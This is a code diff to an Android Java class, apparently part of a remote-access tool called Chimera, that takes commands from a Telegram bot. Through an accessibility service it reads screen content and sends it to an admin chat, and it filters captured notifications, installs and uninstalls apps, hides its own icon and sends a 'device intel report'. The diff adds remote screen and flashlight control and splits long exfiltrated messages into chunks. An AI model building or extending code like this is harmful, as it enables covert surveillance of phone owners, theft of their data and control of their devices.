@@ -1,7 +1,6 @@
 package com.chimera;
 
 import android.accessibilityservice.AccessibilityService;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
@@ -25,24 +24,21 @@ import java.util.List;
 public class TelegramBotWorker implements Runnable {
     private final Context context;
     private long lastUpdateId = 0;
-    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL, FOR_LINK_OPEN, FOR_NOTIFICATION_FILTER }
+    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_LINK_OPEN, FOR_NOTIFICATION_FILTER, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL }
     private WaitingState currentState = WaitingState.NONE;
     private int customDuration = 0;
     private int customScale = 100;
-    private static String notificationFilterPackage = null;
 
     public TelegramBotWorker(Context ctx) { this.context = ctx.getApplicationContext(); }
     public static String getNotificationFilter() { return notificationFilterPackage; }
+    private static String notificationFilterPackage = null;
 
     @Override
     public void run() {
         while (!Thread.currentThread().isInterrupted()) {
-            try {
-                pollForUpdates();
-                Thread.sleep(3000);
-            } catch (InterruptedException ie) {
-                Thread.currentThread().interrupt(); break;
-            } catch (Exception e) { ErrorLogger.logError(context, "RunLoop", e); }
+            try { pollForUpdates(); Thread.sleep(3000); }
+            catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
+            catch (Exception e) { ErrorLogger.logError(context, "RunLoop", e); }
         }
     }
 
@@ -89,7 +85,7 @@ public class TelegramBotWorker implements Runnable {
                     break;
                 case "/open_link":
                     if (parts.length > 1) openLink(parts[1]);
-                    else sendMessage("Usage: `/open_link <url>`", context);
+                    else { currentState = WaitingState.FOR_LINK_OPEN; sendMessage("Reply with the full URL to open (e.g., https://google.com)", context); }
                     break;
                 case "/show_image":
                     customDuration = 10; customScale = 100;
@@ -170,7 +166,7 @@ public class TelegramBotWorker implements Runnable {
             String data = cb.getString("data");
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
             int messageId = cb.getJSONObject("message").getInt("message_id");
-            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("BACK_TO_GESTURES"))) { sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context); return; }
+            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("BACK_TO_GESTURES") || data.equals("SCREEN_OFF"))) { sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context); return; }
             switch (data) {
                 case "LIST_APPS": listAllApps(); break;
                 case "LAUNCH_APP": currentState = WaitingState.FOR_PACKAGE_NAME_LAUNCH; sendMessage("Reply with the package name to launch.", context); break;
@@ -183,12 +179,17 @@ public class TelegramBotWorker implements Runnable {
                 case "NOTIF_CLEAR_FILTER": setNotificationFilter(null); break;
                 case "NOTIF_ENABLE": setNotificationListenerState(true); break;
                 case "NOTIF_DISABLE": setNotificationListenerState(false); break;
+                case "SCREEN_PANEL": sendScreenPanel(chatId, messageId); break;
+                case "SCREEN_ON": context.startActivity(new Intent(context, WakeActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); break;
+                case "SCREEN_OFF": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN); break;
+                case "FLASHLIGHT_ON": DeviceControlHandler.setFlashlightState(context, true); break;
+                case "FLASHLIGHT_OFF": DeviceControlHandler.setFlashlightState(context, false); break;
                 case "ACC_GET_CONTENT": sendMessage(ChimeraAccessibilityService.getScreenContent(), context); break;
                 case "ACC_GESTURES": sendGesturePanel(chatId, messageId); break;
                 case "ACC_ACTION_BACK": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK); break;
                 case "ACC_ACTION_HOME": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME); break;
                 case "ACC_ACTION_RECENTS": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS); break;
-                case "BACK_TO_MAIN": sendControlPanel(); editMessage(chatId, messageId, "Control panel closed."); break;
+                case "BACK_TO_MAIN": sendControlPanel(chatId, messageId); break;
                 case "EXIT_PANEL": editMessage(chatId, messageId, "Control panel closed."); break;
             }
         } catch (Exception e) { ErrorLogger.logError(context, "HandleCallback", e); }
@@ -255,9 +256,7 @@ public class TelegramBotWorker implements Runnable {
             int state = enable ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
             pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
             sendMessage("Notification Listener service has been " + (enable ? "ENABLED" : "DISABLED") + ".", context);
-        } catch (Exception e) {
-            sendMessage("Failed to change Notification Listener state.", context);
-        }
+        } catch (Exception e) { sendMessage("Failed to change Notification Listener state.", context); }
     }
     
     private void listAllApps() {
@@ -283,7 +282,7 @@ public class TelegramBotWorker implements Runnable {
                 + "`/device_details` - Get device intel report.\n"
                 + "`/toggle_app_hide` | `_show` - Toggle icon.\n"
                 + "`/grant_usage_access` - Open Usage Access settings.\n"
-                + "`/open_link <url>` - Open a link.\n"
+                + "`/open_link [url]` - Open a link.\n"
                 + "`/show_image [dur] [scale]` - Prompt for image upload.\n"
                 + "`/play_audio [dur|full]` - Prompt for audio upload.\n"
                 + "`/help` - Show this message.", context);
@@ -296,11 +295,16 @@ public class TelegramBotWorker implements Runnable {
             rows.put(new JSONArray().put(new JSONObject().put("text", "List Apps").put("callback_data", "LIST_APPS")).put(new JSONObject().put("text", "Launch App").put("callback_data", "LAUNCH_APP")).put(new JSONObject().put("text", "Uninstall App").put("callback_data", "UNINSTALL_APP")));
             rows.put(new JSONArray().put(new JSONObject().put("text", "Install App (APK)").put("callback_data", "INSTALL_APP")).put(new JSONObject().put("text", "Set Volume").put("callback_data", "SET_VOLUME")));
             rows.put(new JSONArray().put(new JSONObject().put("text", "Notifications").put("callback_data", "NOTIFICATIONS_PANEL")).put(new JSONObject().put("text", "Gestures").put("callback_data", "ACC_GESTURES")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Get Screen Content").put("callback_data", "ACC_GET_CONTENT")));
+            rows.put(new JSONArray().put(new JSONObject().put("text", "Screen & Device").put("callback_data", "SCREEN_PANEL")).put(new JSONObject().put("text", "Get Screen Content").put("callback_data", "ACC_GET_CONTENT")));
             rows.put(new JSONArray().put(new JSONObject().put("text", "❌ Exit Panel ❌").put("callback_data", "EXIT_PANEL")));
             keyboard.put("inline_keyboard", rows);
             sendMessageWithMarkup("`Chimera Control Panel`", keyboard);
         } catch (Exception e) { ErrorLogger.logError(context, "SendControlPanel", e); }
+    }
+
+    private void sendControlPanel(long chatId, int messageId) {
+        editMessage(chatId, messageId, "");
+        sendControlPanel();
     }
     
     private void sendNotificationPanel(long chatId, int messageId) {
@@ -314,6 +318,18 @@ public class TelegramBotWorker implements Runnable {
             keyboard.put("inline_keyboard", rows);
             editMessageMarkup(chatId, messageId, "`Notification Control`", keyboard);
         } catch (Exception e) { ErrorLogger.logError(context, "SendNotifPanel", e); }
+    }
+
+    private void sendScreenPanel(long chatId, int messageId) {
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(new JSONObject().put("text", "Screen On").put("callback_data", "SCREEN_ON")).put(new JSONObject().put("text", "Screen Off").put("callback_data", "SCREEN_OFF")));
+            rows.put(new JSONArray().put(new JSONObject().put("text", "Flashlight On").put("callback_data", "FLASHLIGHT_ON")).put(new JSONObject().put("text", "Flashlight Off").put("callback_data", "FLASHLIGHT_OFF")));
+            rows.put(new JSONArray().put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, "`Screen & Device Control`", keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendScreenPanel", e); }
     }
 
     private void sendGesturePanel(long chatId, int messageId) {
@@ -380,6 +396,17 @@ public class TelegramBotWorker implements Runnable {
     }
     
     public static void sendMessage(String message, Context context) {
+        if (message.length() > 4096) {
+            for (int i = 0; i < message.length(); i += 4096) {
+                String chunk = message.substring(i, Math.min(i + 4096, message.length()));
+                sendMessageChunk(chunk, context);
+            }
+        } else {
+            sendMessageChunk(message, context);
+        }
+    }
+
+    private static void sendMessageChunk(String message, Context context) {
         try {
             JSONObject body = new JSONObject(); body.put("chat_id", ConfigLoader.getAdminId());
             body.put("text", message); body.put("parse_mode", "Markdown");
@@ -419,8 +446,6 @@ public class TelegramBotWorker implements Runnable {
                 conn.setDoOutput(true);
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-                conn.setConnectTimeout(60000);
-                conn.setReadTimeout(60000);
                 try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
                     writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED).append(LINE_FEED).append(String.valueOf(chatId)).append(LINE_FEED);
                     writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED).append(LINE_FEED).append(caption).append(LINE_FEED);
